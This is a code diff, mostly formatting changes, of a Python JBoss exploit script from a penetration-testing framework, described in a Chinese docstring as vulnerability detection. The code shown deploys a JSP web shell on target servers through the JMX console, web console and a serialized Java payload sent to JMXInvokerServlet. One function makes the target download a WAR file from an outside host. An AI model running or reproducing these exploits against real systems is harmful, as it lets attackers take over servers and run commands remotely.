@@ -1,5 +1,8 @@
-#!/usr/bin/env python
+# !/usr/bin/env python
 # -*- coding: utf-8 -*-
+# author = i@cdxy.me
+# project = https://github.com/Xyntax/POC-T
+
 """
 JBoss 三种POC漏洞检测，修改自 https://github.com/joaomatosf/jexboss
 
@@ -18,6 +21,7 @@ WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 See the License for the specific language governing permissions and
 limitations under the License.
 """
+
 from sys import exit, version_info
 from time import sleep
 from random import randint
@@ -80,6 +84,7 @@ def get_successfully(url, path):
         result = r.status
     return result
 
+
 def exploit_jmx_console_main_deploy(url):
     """
     Exploit MainDeployer to deploy a JSP shell. Does not work in JBoss 5 (bug in JBoss 5).
@@ -88,17 +93,18 @@ def exploit_jmx_console_main_deploy(url):
     :return: The HTTP status code
     """
     if not 'http' in url[:4]:
-        url = "http://"+url
+        url = "http://" + url
 
     jsp = "http://www.joaomatosf.com/rnp/jexws.war"
     payload = ("/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service="
-               "MainDeployer&methodIndex=19&arg0="+jsp)
+               "MainDeployer&methodIndex=19&arg0=" + jsp)
 
     headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Connection": "keep-alive",
                "User-Agent": user_agents[randint(0, len(user_agents) - 1)]}
     pool.request('HEAD', url + payload, redirect=False, headers=headers)
     return get_successfully(url, "/jexws/jexws.jsp")
+
 
 def exploit_jmx_console_file_repository(url):
     """
@@ -165,6 +171,7 @@ def exploit_jmx_console_file_repository(url):
     pool.request('HEAD', url + payload, redirect=False, headers=headers)
     return get_successfully(url, "/jexws/jexws.jsp")
 
+
 def exploit_jmx_invoker_file_repository(url, version):
     """
     Exploits the JMX invoker
@@ -175,13 +182,13 @@ def exploit_jmx_invoker_file_repository(url, version):
     :return:
     """
     payload = ("\xac\xed\x00\x05\x73\x72\x00\x29\x6f\x72\x67\x2e\x6a\x62\x6f\x73\x73\x2e"
-        "\x69\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x2e\x4d\x61\x72\x73\x68\x61\x6c\x6c"
-        "\x65\x64\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\xf6\x06\x95\x27\x41\x3e\xa4"
-        "\xbe\x0c\x00\x00\x78\x70\x70\x77\x08\x78\x94\x98\x47\xc1\xd0\x53\x87\x73\x72"
-        "\x00\x11\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x49\x6e\x74\x65\x67\x65\x72"
-        "\x12\xe2\xa0\xa4\xf7\x81\x87\x38\x02\x00\x01\x49\x00\x05\x76\x61\x6c\x75\x65"
-        "\x78\x72\x00\x10\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4e\x75\x6d\x62\x65"
-        "\x72\x86\xac\x95\x1d\x0b\x94\xe0\x8b\x02\x00\x00\x78\x70")
+               "\x69\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x2e\x4d\x61\x72\x73\x68\x61\x6c\x6c"
+               "\x65\x64\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\xf6\x06\x95\x27\x41\x3e\xa4"
+               "\xbe\x0c\x00\x00\x78\x70\x70\x77\x08\x78\x94\x98\x47\xc1\xd0\x53\x87\x73\x72"
+               "\x00\x11\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x49\x6e\x74\x65\x67\x65\x72"
+               "\x12\xe2\xa0\xa4\xf7\x81\x87\x38\x02\x00\x01\x49\x00\x05\x76\x61\x6c\x75\x65"
+               "\x78\x72\x00\x10\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4e\x75\x6d\x62\x65"
+               "\x72\x86\xac\x95\x1d\x0b\x94\xe0\x8b\x02\x00\x00\x78\x70")
     payload += ("\xe3\x2c\x60\xe6") if version == 0 else ("\x26\x95\xbe\x0a")
     payload += (
         "\x73\x72\x00\x24\x6f\x72\x67\x2e\x6a\x62\x6f\x73\x73\x2e\x69\x6e\x76\x6f\x63\x61"
@@ -283,6 +290,7 @@ def exploit_jmx_invoker_file_repository(url, version):
     pool.urlopen('HEAD', url + "/invoker/JMXInvokerServlet", redirect=False, headers=headers, body=payload)
     return get_successfully(url, "/jexinv/jexinv.jsp")
 
+
 def exploit_web_console_invoker(url):
     """
     Exploits web console invoker
@@ -336,7 +344,7 @@ def exploit_web_console_invoker(url):
     return get_successfully(url, "/jexws/jexws.jsp")
 
 
-def auto_exploit(url,exploit_type):
+def auto_exploit(url, exploit_type):
     # print(GREEN + "\n * Sending exploit code to %s. Please wait...\n" % url)
     result = 505
     if exploit_type == "jmx-console":
@@ -354,14 +362,13 @@ def auto_exploit(url,exploit_type):
         return True
         # shell_http(url, exploit_type)
 
+
 def info():
     pass
 
 
 def exp():
     pass
-
-
 
 
 def poc(url):
@@ -396,12 +403,11 @@ def poc(url):
         step2 = False
         try:
             step2 = auto_exploit(url, exploit_type)
-        except Exception,e:
+        except Exception, e:
             pass
         return step2
     else:
         return False
-
 
 
 if __name__ == '__main__':
